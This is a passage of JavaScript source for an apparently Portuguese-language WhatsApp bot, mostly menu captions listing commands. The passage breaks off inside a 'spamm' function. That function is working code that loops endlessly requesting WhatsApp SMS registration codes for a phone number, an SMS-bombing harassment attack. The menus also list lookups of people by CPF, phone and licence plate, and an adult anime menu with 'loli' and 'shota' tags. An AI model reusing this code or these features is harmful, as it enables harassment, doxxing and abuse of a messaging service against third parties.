‚îÉ‚ùêñ•®${prefix}menuanime
‚îÉ‚ùêñ•®${prefix}menulogo
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•®${prefix}perfil
‚îÉ‚ùêñ•®${prefix}caluladora
‚îÉ‚ùêñ•®${prefix}letra
‚îÉ‚ùêñ•®${prefix}criador
‚îÉ‚ùêñ•®${prefix}suporte
‚îÉ‚ùêñ•®${prefix}rankativo
‚îÉ‚ùêñ•®${prefix}metadinha
‚îÉ‚ùêñ•®${prefix}s
‚îÉ‚ùêñ•®${prefix}figurinhas
‚îÉ‚ùêñ•®${prefix}toimg
‚îÉ‚ùêñ•®${prefix}hd
‚îÉ‚ùêñ•®${prefix}gerarlink
‚îÉ‚ùêñ•®${prefix}pinterest
‚îÉ‚ùêñ•®${prefix}fakechat
‚îÉ‚ùêñ•®${prefix}calendario
‚îÉ‚ùêñ•®${prefix}ping
‚îÉ‚ùêñ•®${prefix}key
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`, 
quoted : vid})
break

case 'menuplay': case 'Menuplay':
reagir(from,`üíñ`) 
try {
await amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
             ùêåùêÑùêçùêî ùêèùêãùêÄùêò  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•®${prefix}play  
‚îÉ‚ùêñ•®${prefix}playdl
‚îÉ‚ùêñ•®${prefix}play2  
‚îÉ‚ùêñ•®${prefix}play3  
‚îÉ‚ùêñ•®${prefix}play4  
‚îÉ‚ùêñ•®${prefix}play5  
‚îÉ‚ùêñ•®${prefix}play6  
‚îÉ‚ùêñ•®${prefix}play7  
‚îÉ‚ùêñ•®${prefix}playmix  
‚îÉ‚ùêñ•®${prefix}play_video  
‚îÉ‚ùêñ•®${prefix}playvideo  
‚îÉ‚ùêñ•®${prefix}playmeme  
‚îÉ‚ùêñ•®${prefix}pinterest  
‚îÉ‚ùêñ•®${prefix}pintemp4  
‚îÉ‚ùêñ•®${prefix}pintemp3  
‚îÉ‚ùêñ•®${prefix}tiktok_video  
‚îÉ‚ùêñ•®${prefix}tiktok_audio  
‚îÉ‚ùêñ•®${prefix}tiktokmp4  
‚îÉ‚ùêñ•®${prefix}tiktokmp3  
‚îÉ‚ùêñ•®${prefix}face_video  
‚îÉ‚ùêñ•®${prefix}face_audio  
‚îÉ‚ùêñ•®${prefix}facemp4  
‚îÉ‚ùêñ•®${prefix}facemp3  
‚îÉ‚ùêñ•®${prefix}insta_video  
‚îÉ‚ùêñ•®${prefix}insta_audio  
‚îÉ‚ùêñ•®${prefix}instamp4  
‚îÉ‚ùêñ•®${prefix}instamp3  
‚îÉ‚ùêñ•®${prefix}spotifymp3  
‚îÉ‚ùêñ•®${prefix}ytmp4  
‚îÉ‚ùêñ•®${prefix}ytmp3  
‚îÉ‚ùêñ•®${prefix}url  
‚îÉ‚ùêñ•®${prefix}xvideos  
‚îÉ‚ùêñ•®${prefix}videoall  
‚îÉ‚ùêñ•®${prefix}audioall  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(error)
}
break 

case 'menulogo': case 'Menulogo':
reagir(from, `üíñ`) 
try {
await amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
             ùêåùêÑùêçùêî ùêãùêéùêÜùêé 
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•®${prefix}glitch
‚îÉ‚ùêñ•®${prefix}write
‚îÉ‚ùêñ•®${prefix}advancedglow  
‚îÉ‚ùêñ•®${prefix}typography
‚îÉ‚ùêñ•®${prefix}pixelglitch  
‚îÉ‚ùêñ•®${prefix}neonglitch  
‚îÉ‚ùêñ•®${prefix}flag
‚îÉ‚ùêñ•®${prefix}flag3d
‚îÉ‚ùêñ•®${prefix}deleting
‚îÉ‚ùêñ•®${prefix}blackpink
‚îÉ‚ùêñ•®${prefix}glowing
‚îÉ‚ùêñ•®${prefix}underwater
‚îÉ‚ùêñ•®${prefix}logomaker  
‚îÉ‚ùêñ•®${prefix}cartoon
‚îÉ‚ùêñ•®${prefix}papercut
‚îÉ‚ùêñ•®${prefix}watercolor
‚îÉ‚ùêñ•®${prefix}effectclouds  
‚îÉ‚ùêñ•®${prefix}blackpinklogo  
‚îÉ‚ùêñ•®${prefix}gradient
‚îÉ‚ùêñ•®${prefix}summerbeach  
‚îÉ‚ùêñ•®${prefix}luxurygold  
‚îÉ‚ùêñ•®${prefix}multicoloredneon  
‚îÉ‚ùêñ•®${prefix}sandsummer  
‚îÉ‚ùêñ•®${prefix}galaxywallpaper  
‚îÉ‚ùêñ•®${prefix}1917
‚îÉ‚ùêñ•®${prefix}makingneon  
‚îÉ‚ùêñ•®${prefix}royal
‚îÉ‚ùêñ•®${prefix}freecreate  
‚îÉ‚ùêñ•®${prefix}galaxy
‚îÉ‚ùêñ•®${prefix}lighteffects  
‚îÉ‚ùêñ•®${prefix}darkgreen
‚îÉ‚ùêñ•®${prefix}dragonball
‚îÉ‚ùêñ•®${prefix}neondevil
‚îÉ‚ùêñ•®${prefix}frozen
‚îÉ‚ùêñ•®${prefix}wooden3d
‚îÉ‚ùêñ•®${prefix}metal3d
‚îÉ‚ùêñ•®${prefix}ligatures
‚îÉ‚ùêñ•®${prefix}3druby
‚îÉ‚ùêñ•®${prefix}sunset 
‚îÉ‚ùêñ•®${prefix}hackerneon 
‚îÉ‚ùêñ•®${prefix}cemetery 
‚îÉ‚ùêñ•®${prefix}halloween 
‚îÉ‚ùêñ•®${prefix}horror 
‚îÉ‚ùêñ•®${prefix}blood 
‚îÉ‚ùêñ•®${prefix}joker 
‚îÉ‚ùêñ•®${prefix}clouds 
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(error)
}
break

case 'menuefeitos': case 'efeitos':
reagir(from,`üíñ`) 
try {
await amy.sendMessage(from,
{image: {url: `https://files.catbox.moe/0mhilb.jpg`},
 caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
       ùêåùêÑùêçùêî ùêÑùêÖùêÑùêàùêìùêéùêí
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•®${prefix}affect
‚îÉ‚ùêñ•®${prefix}comunismo
‚îÉ‚ùêñ•®${prefix}mms
‚îÉ‚ùêñ•®${prefix}bobross
‚îÉ‚ùêñ•®${prefix}bolsonaro
‚îÉ‚ùêñ•®${prefix}blur
‚îÉ‚ùêñ•®${prefix}karaba
‚îÉ‚ùêñ•®${prefix}reautiful
‚îÉ‚ùêñ•®${prefix}circle
‚îÉ‚ùêñ•®${prefix}del
‚îÉ‚ùêñ•®${prefix}invert
‚îÉ‚ùêñ•®${prefix}facepalm
‚îÉ‚ùêñ•®${prefix}jail
‚îÉ‚ùêñ•®${prefix}rip
‚îÉ‚ùêñ•®${prefix}pixelate
‚îÉ‚ùêñ•®${prefix}trash
‚îÉ‚ùêñ•®${prefix}merda
‚îÉ‚ùêñ•®${prefix}borrar
‚îÉ‚ùêñ•®${prefix}hitler
‚îÉ‚ùêñ•®${prefix}procurado
‚îÉ‚ùêñ•®${prefix}deletem
‚îÉ‚ùêñ•®${prefix}preso
‚îÉ‚ùêñ•®${prefix}morto
‚îÉ‚ùêñ•®${prefix}lgbt
‚îÉ‚ùêñ•®${prefix}lixo
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`},
 {quoted: live})
} catch (error) {
console.log(e)
}
break 
    
case 'brincadeiras': case 'Brincadeiras':
reagir(from,`üíñ`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
            ùêÄùêïùêÄùêãùêàùêÄùêÇÃßùêéùêÑùêí
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}chifre  
‚îÉ‚ùêñ•® ${prefix}pau  
‚îÉ‚ùêñ•® ${prefix}gado  
‚îÉ‚ùêñ•® ${prefix}gada  
‚îÉ‚ùêñ•® ${prefix}corno  
‚îÉ‚ùêñ•® ${prefix}corna  
‚îÉ‚ùêñ•® ${prefix}bonita  
‚îÉ‚ùêñ•® ${prefix}bebado  
‚îÉ‚ùêñ•® ${prefix}feio  
‚îÉ‚ùêñ•® ${prefix}vesgo  
‚îÉ‚ùêñ•® ${prefix}gostoso  
‚îÉ‚ùêñ•® ${prefix}gostosa  
‚îÉ‚ùêñ•® ${prefix}infiel  
‚îÉ‚ùêñ•® ${prefix}gay  
‚îÉ‚ùêñ•® ${prefix}fiel  
‚îÉ‚ùêñ•® ${prefix}nazista  
‚îÉ‚ùêñ•® ${prefix}alma-gemeas  
‚îÉ‚ùêñ•® ${prefix}punheteiro  
‚îÉ‚ùêñ•® ${prefix}maconheiro  
‚îÉ‚ùêñ•® ${prefix}maconheira  
‚îÉ‚ùêñ•® ${prefix}pervertido  
‚îÉ‚ùêñ•® ${prefix}dogolpe  
‚îÉ‚ùêñ•® ${prefix}guloso  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
           ùêÅùêëùêàùêçùêÇùêÄùêÉùêÑùêàùêëùêÄùêí  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}presentinho  
‚îÉ‚ùêñ•® ${prefix}gadometro  
‚îÉ‚ùêñ•® ${prefix}morte  
‚îÉ‚ùêñ•® ${prefix}chance  
‚îÉ‚ùêñ•® ${prefix}quando  
‚îÉ‚ùêñ•® ${prefix}surubao  
‚îÉ‚ùêñ•® ${prefix}desafio  
‚îÉ‚ùêñ•® ${prefix}eununca  
‚îÉ‚ùêñ•® ${prefix}gf  
‚îÉ‚ùêñ•® ${prefix}tapa  
‚îÉ‚ùêñ•® ${prefix}beijar  
‚îÉ‚ùêñ•® ${prefix}matar  
‚îÉ‚ùêñ•® ${prefix}soco  
‚îÉ‚ùêñ•® ${prefix}chute  
‚îÉ‚ùêñ•® ${prefix}cassino  
‚îÉ‚ùêñ•® ${prefix}suicidio  
‚îÉ‚ùêñ•® ${prefix}namorar  
‚îÉ‚ùêñ•® ${prefix}cancelarpedido  
‚îÉ‚ùêñ•® ${prefix}minhadupla  
‚îÉ‚ùêñ•® ${prefix}terminar  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuadm': case 'Menuadm':
reagir(from,`üíñ`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
           ùêåùêÑùêçùêî ùêÄùêÉùêåùêàùêç/ùêÜùêëùêîùêèùêé  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}ban  
‚îÉ‚ùêñ•® ${prefix}banf  
‚îÉ‚ùêñ•® ${prefix}limpar  
‚îÉ‚ùêñ•® ${prefix}roletarussa  
‚îÉ‚ùêñ•® ${prefix}nomegp  
‚îÉ‚ùêñ•® ${prefix}descgp  
‚îÉ‚ùêñ•® ${prefix}idgp  
‚îÉ‚ùêñ•® ${prefix}status  
‚îÉ‚ùêñ•® ${prefix}linkgp  
‚îÉ‚ùêñ•® ${prefix}rmfotogp  
‚îÉ‚ùêñ•® ${prefix}fotogp  
‚îÉ‚ùêñ•® ${prefix}marcar  
‚îÉ‚ùêñ•® ${prefix}totag  
‚îÉ‚ùêñ•® ${prefix}marcarwa  
‚îÉ‚ùêñ•® ${prefix}mute  
‚îÉ‚ùêñ•® ${prefix}desmute  
‚îÉ‚ùêñ•® ${prefix}advertir  
‚îÉ‚ùêñ•® ${prefix}rmadv  
‚îÉ‚ùêñ•® ${prefix}promover  
‚îÉ‚ùêñ•® ${prefix}rebaixar  
‚îÉ‚ùêñ•® ${prefix}delete  
‚îÉ‚ùêñ•® ${prefix}grupo [a/f]  
‚îÉ‚ùêñ•® ${prefix}resetarlink  
‚îÉ‚ùêñ•® ${prefix}sorteio  
‚îÉ‚ùêñ•® ${prefix}recrutar  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
         ùêÄùêìùêàùêïùêÄ√á√ïùêÑùêí ùêÜùêëùêîùêèùêé  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}x9visuunica [1/0]  
‚îÉ‚ùêñ•® ${prefix}modogame [1/0]  
‚îÉ‚ùêñ•® ${prefix}bem-vindo [1/0]  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menudono': case 'Menudono':
reagir(from,`üíñ`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
         ùêåùêÑùêçùêî ùêÉùêéùêçùêé/ùêÇùêéùêçùêÖùêàùêÜ  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}rmv-perfil  
‚îÉ‚ùêñ•® ${prefix}nome-perfil  
‚îÉ‚ùêñ•® ${prefix}recado  
‚îÉ‚ùêñ•® ${prefix}perfil-bot  
‚îÉ‚ùêñ•® ${prefix}reiniciar  
‚îÉ‚ùêñ•® ${prefix}index-bot  
‚îÉ‚ùêñ•® ${prefix}getcase  
‚îÉ‚ùêñ•® ${prefix}get  
‚îÉ‚ùêñ•® ${prefix}apagar  
‚îÉ‚ùêñ•® ${prefix}entrar  
‚îÉ‚ùêñ•® ${prefix}cases  
‚îÉ‚ùêñ•® ${prefix}nuke  
‚îÉ‚ùêñ•® ${prefix}listagp  
‚îÉ‚ùêñ•® ${prefix}sairdogp  
‚îÉ‚ùêñ•® ${prefix}listavip  
‚îÉ‚ùêñ•® ${prefix}delvip  
‚îÉ‚ùêñ•® ${prefix}addvip  
‚îÉ‚ùêñ•® ${prefix}servip  
‚îÉ‚ùêñ•® ${prefix}unbangp  
‚îÉ‚ùêñ•® ${prefix}bangp  
‚îÉ‚ùêñ•® ${prefix}sermembro  
‚îÉ‚ùêñ•® ${prefix}seradm  
‚îÉ‚ùêñ•® ${prefix}prefixo-bot  
‚îÉ‚ùêñ•® ${prefix}addkey  
‚îÉ‚ùêñ•® ${prefix}delkey  
‚îÉ‚ùêñ•® ${prefix}key  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuvip': case 'Menuvip':
reagir(from,`üíñ`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
            ùêåùêÑùêçùêî ùêèùêîùêóùêÄùêÉùêÄùêí  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}nome  
‚îÉ‚ùêñ•® ${prefix}cpf  
‚îÉ‚ùêñ•® ${prefix}telefone  
‚îÉ‚ùêñ•® ${prefix}cep  
‚îÉ‚ùêñ•® ${prefix}cnpj  
‚îÉ‚ùêñ•® ${prefix}placa  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 

case 'menuanime': case 'Menuanime':
reagir(from,`üíñ`) 
try {
amy.sendMessage(from, {image: {url: `https://files.catbox.moe/0mhilb.jpg`}, caption: `‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
            ùêÄùêçùêàùêåùêÑùêí +ùüèùüñ  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}hentai-vid  
‚îÉ‚ùêñ•® ${prefix}hentai-gay  
‚îÉ‚ùêñ•® ${prefix}lesbian  
‚îÉ‚ùêñ•® ${prefix}ass  
‚îÉ‚ùêñ•® ${prefix}bdms  
‚îÉ‚ùêñ•® ${prefix}blowjob  
‚îÉ‚ùêñ•® ${prefix}cuckold  
‚îÉ‚ùêñ•® ${prefix}cum  
‚îÉ‚ùêñ•® ${prefix}ero  
‚îÉ‚ùêñ•® ${prefix}femdom  
‚îÉ‚ùêñ•® ${prefix}foot  
‚îÉ‚ùêñ•® ${prefix}gankbang  
‚îÉ‚ùêñ•® ${prefix}glasses  
‚îÉ‚ùêñ•® ${prefix}hentai  
‚îÉ‚ùêñ•® ${prefix}jahy  
‚îÉ‚ùêñ•® ${prefix}manga  
‚îÉ‚ùêñ•® ${prefix}neko  
‚îÉ‚ùêñ•® ${prefix}orgy  
‚îÉ‚ùêñ•® ${prefix}panties  
‚îÉ‚ùêñ•® ${prefix}pussy  
‚îÉ‚ùêñ•® ${prefix}neko2  
‚îÉ‚ùêñ•® ${prefix}tentacles  
‚îÉ‚ùêñ•® ${prefix}thighs  
‚îÉ‚ùêñ•® ${prefix}yuri  
‚îÉ‚ùêñ•® ${prefix}zettai  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
      ùêÄùêçùêàùêåùêÑùêí/ùêàùêåùêÄùêÜùêÑùêçùêí  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}toukachan  
‚îÉ‚ùêñ•® ${prefix}megumin  
‚îÉ‚ùêñ•® ${prefix}keneki  
‚îÉ‚ùêñ•® ${prefix}onepiece  
‚îÉ‚ùêñ•® ${prefix}tsunade  
‚îÉ‚ùêñ•® ${prefix}sasuke  
‚îÉ‚ùêñ•® ${prefix}sakura  
‚îÉ‚ùêñ•® ${prefix}madara  
‚îÉ‚ùêñ•® ${prefix}itachi  
‚îÉ‚ùêñ•® ${prefix}inori  
‚îÉ‚ùêñ•® ${prefix}hestia  
‚îÉ‚ùêñ•® ${prefix}chitoge  
‚îÉ‚ùêñ•® ${prefix}emilia  
‚îÉ‚ùêñ•® ${prefix}avusawa  
‚îÉ‚ùêñ•® ${prefix}asuna  
‚îÉ‚ùêñ•® ${prefix}deidara  
‚îÉ‚ùêñ•® ${prefix}anna  
‚îÉ‚ùêñ•® ${prefix}rize  
‚îÉ‚ùêñ•® ${prefix}nezuko  
‚îÉ‚ùêñ•® ${prefix}sagari  
‚îÉ‚ùêñ•® ${prefix}minato  
‚îÉ‚ùêñ•® ${prefix}naruto  
‚îÉ‚ùêñ•® ${prefix}hinata  
‚îÉ‚ùêñ•® ${prefix}elaina  
‚îÉ‚ùêñ•® ${prefix}erza  
‚îÉ‚ùêñ•® ${prefix}eba  
‚îÉ‚ùêñ•® ${prefix}shinka  
‚îÉ‚ùêñ•® ${prefix}kagura  
‚îÉ‚ùêñ•® ${prefix}shina  
‚îÉ‚ùêñ•® ${prefix}isuku  
‚îÉ‚ùêñ•® ${prefix}gremory  
‚îÉ‚ùêñ•® ${prefix}akiyama  
‚îÉ‚ùêñ•® ${prefix}mikasa  
‚îÉ‚ùêñ•® ${prefix}kotori  
‚îÉ‚ùêñ•® ${prefix}kaga  
‚îÉ‚ùêñ•® ${prefix}shizuka  
‚îÉ‚ùêñ•® ${prefix}kaori  
‚îÉ‚ùêñ•® ${prefix}boruto  
‚îÉ‚ùêñ•® ${prefix}chiho  
‚îÉ‚ùêñ•® ${prefix}tejina  
‚îÉ‚ùêñ•® ${prefix}yumeko  
‚îÉ‚ùêñ•® ${prefix}shinomiya  
‚îÉ‚ùêñ•® ${prefix}yotsuba  
‚îÉ‚ùêñ•® ${prefix}shota  
‚îÉ‚ùêñ•® ${prefix}loli  
‚îÉ‚ùêñ•® ${prefix}waifu  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ  
         ùêÑùêÉùêàùêìùêí/ùêï√çùêÉùêÑùêéùêí  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ  

‚ï≠‚ä∞‚ùñ·ØΩ‚ïê‚ô°‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ô°‚ïê·ØΩ‚ùñ‚ä±‚ïÆ
‚îÉ‚ùêñ•® ${prefix}edit-aleatorios  
‚îÉ‚ùêñ•® ${prefix}edit-bleach  
‚îÉ‚ùêñ•® ${prefix}edit-chain  
‚îÉ‚ùêñ•® ${prefix}edit-slayer  
‚îÉ‚ùêñ•® ${prefix}edit-dragon  
‚îÉ‚ùêñ•® ${prefix}edit-hunters  
‚îÉ‚ùêñ•® ${prefix}edit-kaisen  
‚îÉ‚ùêñ•® ${prefix}edit-naruto  
‚ï∞‚ä∞‚ùñ·ØΩ‚ô°‚ïê‚Ä¢‚ä∞‚ùñ‚ä±‚Ä¢‚ïê‚ô°·ØΩ‚ùñ‚ä±‚ïØ`}, {quoted: live})
} catch (error) {
console.log(e)
}
break 


case 'spamm':
if(!isCreator) return reply(msg.dono)
  if (!q) return reply('*digite o n√∫mero sem o  +55 , Exemplo  96991093456*');
reply("*aguarde um momento, estou dando spam sms no n√∫mero..*.")
  const numi2 = from.replace('55', '');
  const numi = numi2.replace('@s.whatsapp.net', '');

  // Fun√ß√£o para solicitar c√≥digo SMS e tentar aumentar o c√≥digo
  async function requestSMSAndIncreaseCode(phoneNumber) {
    const maxCode = -1;
    let code = 0;

    while (code !== maxCode) {
      try {
        const cu1 = await amy.requestRegistrationCode({
          phoneNumber: `+55${phoneNumber}`,
          phoneNumberCountryCode: '55',
          phoneNumberNationalNumber: phoneNumber,
          phoneNumberMobileCountryCode: 724,
          method: 'sms'
        });

        // Sua l√≥gica para verificar a resposta cu1 e aumentar o c√≥digo
        // Por exemplo, verifique se cu1 √© v√°lido e aumente o c√≥digo
        if (cu1 && cu1.someCondition) {
          code++; // Aumenta o c√≥digo
        }
      } catch (error) {
        console.log("*Erro ao solicitar c√≥digo SMS*:", error);
      }
    }

    // O c√≥digo chegou a -1
